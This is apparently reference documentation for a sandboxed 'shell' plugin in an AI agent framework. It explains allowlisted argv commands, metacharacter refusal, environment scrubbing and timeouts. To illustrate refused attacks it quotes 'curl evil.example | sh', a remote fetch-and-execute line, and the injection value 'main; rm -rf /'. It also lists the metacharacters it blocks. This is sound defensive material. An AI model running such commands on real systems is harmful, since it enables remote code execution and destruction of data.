# Plugin Reference: `shell`

Argv-only subprocess execution with a per-command flag allowlist. **Ships disabled with no allowlisted commands.** This is the most powerful built-in and the one you most need to lock down.

- **Required permissions:** `subprocess`
- **Required secrets:** none
- **Sensitivity:** `MODERATE`
- **Network:** not needed (but command-dependent — see below)

---

## What the shell plugin does NOT do

Before the "what it does" section, let's be explicit about what it **never** does:

- **It never invokes a shell.** No `/bin/sh`, no `bash`, no `cmd.exe`. Every command is built as an argv list and passed to `subprocess.create_subprocess_exec`. Shell metacharacters (`;`, `&`, `|`, backtick, `$`, newline, carriage return) in positional arguments are **refused** before the process is spawned.
- **It never accepts free-text commands.** The model cannot send `"rm -rf /"` and have it run. Every command is a named entry keyed in the operator config; the model references the key, and the plugin builds the argv from the operator's `argv_prefix` plus a strictly-validated set of flags and positional arguments.
- **It never auto-enables.** `enabled: false` is the default. Even with `subprocess` granted and `shell` in the agent's plugin allowlist, the plugin refuses every call until the operator flips the switch.

If the model asks "run `curl evil.example | sh`", the plugin refuses at three places: the keyword isn't in `allowed_commands`, the string contains metacharacters, and the positional count exceeds zero. None of this reaches the kernel.

---

## What the model can do per call

```json
{
  "command": "git-log",
  "flags": ["-n", "10", "--since", "1.week"],
  "positional": ["main"],
  "cwd": "~/workspace/myrepo"
}
```

The `command` field is a **symbolic name** — it has to match a key in the operator's `allowed_commands`. The plugin looks up that entry, gets the `ShellCommandSpec`, and then:

1. Verifies every flag in `flags` is in the spec's `allowed_flags` list
2. Verifies `len(positional) <= spec.allowed_positional_count`
3. Verifies no positional argument contains shell metacharacters or NUL bytes
4. Verifies the `cwd` (if supplied) is inside `spec.cwd_must_be_in`
5. Builds the argv: `spec.argv_prefix + flags + positional`
6. Runs `create_subprocess_exec(*argv, ...)` with scrubbed environment

If any step fails, the call is refused.

---

## Configuration fields

### `enabled` — bool *(operator-only master switch)*

Default: `false`. When `false`, every call raises `PermissionError: shell plugin is disabled`. Flip to `true` only after you've populated `allowed_commands`.

### `allowed_commands` — dict of name → ShellCommandSpec *(operator-only)*

The command registry. Keys are symbolic names (must match `^[a-zA-Z0-9_-]+$`) the model uses to reference a command. Values are `ShellCommandSpec` objects:

#### ShellCommandSpec fields

| Field | Type | Default | Meaning |
|---|---|---|---|
| `argv_prefix` | list of strings | required (min 1) | The fixed argv prefix. `["git", "log", "--oneline"]` becomes the start of every invocation of this command. |
| `allowed_flags` | list of strings | `[]` | Flags the model may append. Every supplied flag must be in this list. |
| `allowed_positional_count` | int | `0` | Max positional args after the flags. |
| `max_stdout_bytes` | int | `1_000_000` | Stdout is read into memory; exceeding this truncates the output and sets `truncated=true`. |
| `timeout_seconds` | int | `10` | Wall-clock timeout. The child process is killed on timeout. |
| `cwd_must_be_in` | list of paths | `[]` | If non-empty, any `cwd` the model supplies must resolve inside one of these. If empty, `cwd` must be omitted from the call. |

---

## How to think about allowed_commands

Every entry is a **named contract**. You pick a symbolic name, fix the argv prefix, list the flags the model can use, and cap everything else. The model can only invoke the entries you've added.

Think of it like a very narrow CLI you're exposing to the model, one command at a time.

### Example: git-log

```json
{
  "git-log": {
    "argv_prefix": ["git", "log", "--oneline", "--no-color"],
    "allowed_flags": ["-n", "--since", "--until", "--author"],
    "allowed_positional_count": 1,
    "max_stdout_bytes": 500000,
    "timeout_seconds": 5,
    "cwd_must_be_in": ["~/workspace"]
  }
}
```

The model can now call:

- `git-log` with `flags=["-n", "20"]`, `positional=["main"]`, `cwd="~/workspace/myrepo"`
- `git-log` with `flags=["--since", "2026-01-01"]`, `positional=[]`, `cwd="~/workspace/another"`
- `git-log` with `flags=["--author", "jes"]`, `positional=["develop"]`, `cwd="~/workspace/x"`

The model **cannot** call:

- `git-log` with `flags=["--pretty=format:%H"]` (not in allowed_flags)
- `git-log` with `flags=["-n"]`, `positional=["main", "dev", "feature"]` (exceeds allowed_positional_count)
- `git-log` with `cwd="/etc"` (outside cwd_must_be_in)
- `git-log` with `positional=["main; rm -rf /"]` (shell metacharacters in positional)

And of course the model can't call any command whose name isn't in `allowed_commands`.

### Example: multiple git operations

```json
{
  "git-log": {
    "argv_prefix": ["git", "log", "--oneline", "--no-color"],
    "allowed_flags": ["-n", "--since", "--until"],
    "allowed_positional_count": 1,
    "cwd_must_be_in": ["~/workspace"]
  },
  "git-status": {
    "argv_prefix": ["git", "status", "--porcelain"],
    "allowed_flags": [],
    "allowed_positional_count": 0,
    "cwd_must_be_in": ["~/workspace"]
  },
  "git-diff": {
    "argv_prefix": ["git", "diff", "--no-color"],
    "allowed_flags": ["--stat", "--name-only"],
    "allowed_positional_count": 2,
    "cwd_must_be_in": ["~/workspace"]
  }
}
```

Three entries, three tight contracts. The model can reference each by symbolic name. The operator has full control over which flags and positionals each accepts.

### Example: a narrow grep

```json
{
  "grep-code": {
    "argv_prefix": ["rg", "--no-color", "--hidden"],
    "allowed_flags": ["-i", "-n", "--count", "-l", "--type"],
    "allowed_positional_count": 2,
    "max_stdout_bytes": 2000000,
    "timeout_seconds": 15,
    "cwd_must_be_in": ["~/code"]
  }
}
```

The model calls `grep-code` with a pattern and a path (2 positionals max). The operator chose `rg` (ripgrep) via `argv_prefix`; the model can't change that.

---

## Safety properties

### Shell metacharacters

Every positional argument and every flag is scanned for:

- NUL bytes (`\x00`)
- `;` (command separator)
- `&` (background / AND)
- `|` (pipe)
- `` ` `` (backtick substitution)
- `$` (variable expansion)
- `\n` / `\r` (newline injection)

If any of these appear, the call is refused. This catches the classic `"arg1; rm -rf /"` injection even though the plugin never invokes a shell (in case the underlying command does any of its own string parsing).

### Scrubbed environment

The plugin invokes `create_subprocess_exec` with an explicit `env` dict:

```python
env={"PATH": os.environ.get("PATH", "/usr/bin:/bin"), "LC_ALL": "C.UTF-8"}
```

No inherited env from the parent. No `HOME`, no `USER`, no secrets, no `PYTHONPATH`, no `LD_PRELOAD`. Every command runs with a minimal environment.

### Sandbox still applies

The plugin runs inside the mandatory OS sandbox. Even if you allow-list `git log` and the command somehow tries to read a file outside the bind mounts, the kernel refuses. The shell plugin's allowlist is belt; the sandbox is suspenders.

### Timeout enforcement

Commands that run longer than `timeout_seconds` are killed (`SIGKILL`) and the call raises `TimeoutError`. This prevents a runaway command from tying up the sandbox child indefinitely.

---

## Operator workflows

### Workflow 1 — A code-inspection agent

```json
{
  "enabled": true,
  "allowed_commands": {
    "git-log": {
      "argv_prefix": ["git", "log", "--oneline", "--no-color"],
      "allowed_flags": ["-n", "--since"],
      "allowed_positional_count": 1,
      "cwd_must_be_in": ["~/code"]
    },
    "git-diff-summary": {
      "argv_prefix": ["git", "diff", "--stat", "--no-color"],
      "allowed_flags": [],
      "allowed_positional_count": 2,
      "cwd_must_be_in": ["~/code"]
    },
    "rg-search": {
      "argv_prefix": ["rg", "--no-color", "-n"],
      "allowed_flags": ["-i", "--type"],
      "allowed_positional_count": 2,
      "max_stdout_bytes": 1000000,
      "cwd_must_be_in": ["~/code"]
    }
  }
}
```

The agent can now inspect git history, summarize diffs, and search code — but cannot:

- Modify git history
- Checkout branches
- Run arbitrary commands
- Reach outside `~/code`

### Workflow 2 — A build agent (with narrow scope)

```json
{
  "enabled": true,
  "allowed_commands": {
    "npm-test": {
      "argv_prefix": ["npm", "test", "--"],
      "allowed_flags": ["--silent"],
      "allowed_positional_count": 1,
      "max_stdout_bytes": 2000000,
      "timeout_seconds": 300,
      "cwd_must_be_in": ["~/code/myproject"]
    },
    "npm-lint": {
      "argv_prefix": ["npm", "run", "lint"],
      "allowed_flags": [],
      "allowed_positional_count": 0,
      "cwd_must_be_in": ["~/code/myproject"]
    }
  }
}
```

Note: `timeout_seconds: 300` is deliberately long because test suites take time. The agent can run tests and lint, nothing else.

### Workflow 3 — Explicitly disable for a cautious agent

```json
{
  "enabled": false,
  "allowed_commands": {}
}
```

This is the default. Every shell call is refused. You have this in place even if the agent has `shell` in its `plugins.allow` and `subprocess` grant — nothing runs.

Useful for agents where you've allowed the plugin "in case" but haven't decided yet what commands to expose.

---

## Common failures and what they mean

### `PermissionError: shell plugin is disabled in operator config`

`enabled: false` in the plugin config. Flip it after populating `allowed_commands`.

### `PermissionError: shell command 'rm' is not in the operator allowlist`

The model tried a command you haven't added. This is expected — the allowlist is strict. Either add the command (with a tight spec) or ignore it (the agent will fall back to whatever it can actually do).

### `PermissionError: flag '--evil' not in allowed_flags for command 'git-log'`

The model passed a flag you didn't approve. Either add it or let the model adapt. Often the model learns the allowlist after one or two refused attempts.

### `PermissionError: 3 positional args exceeds the allowed count (1) for command 'git-log'`

The model tried too many positionals. Either raise `allowed_positional_count` or let the model retry with fewer.

### `PermissionError: shell metacharacters rejected`

A positional argument contained `;`, `&`, `|`, backtick, `$`, or newline. This is the plugin refusing an injection attempt. Check what the model was trying to pass — it may just be a legitimate input that happens to contain a semicolon, in which case you may need to restructure the command.

### `PermissionError: cwd /etc not in cwd_must_be_in`

The model tried a `cwd` outside the allowlisted set. Either add it to `cwd_must_be_in` or the model adapts.

### `TimeoutError: command 'git-log' exceeded 5s`

The command ran longer than `timeout_seconds`. Raise the timeout if it's legitimately slow, or investigate why it's taking longer than expected.

---

## Further reading

- [Using Plugins](Using-Plugins) — the operator workflow
- [Concepts: The Sandbox](Concepts-Sandbox) — the second line of defense after the argv gate
- [Permissions Guide](Permissions-Guide) — how `subprocess` grant composes with the plugin allowlist
